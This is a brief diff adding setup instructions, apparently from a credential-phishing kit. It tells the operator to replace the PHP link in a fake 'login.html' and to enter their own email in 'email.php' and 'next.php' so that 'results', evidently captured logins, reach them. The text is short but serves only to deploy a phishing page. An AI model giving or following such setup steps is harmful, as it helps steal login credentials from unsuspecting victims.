@@ -1,0 +1,3 @@
+Search for "next.php" in the file "login.html" and replace the php link with urs
+
+Then put ur email for result in both "email.php"and "next.php"
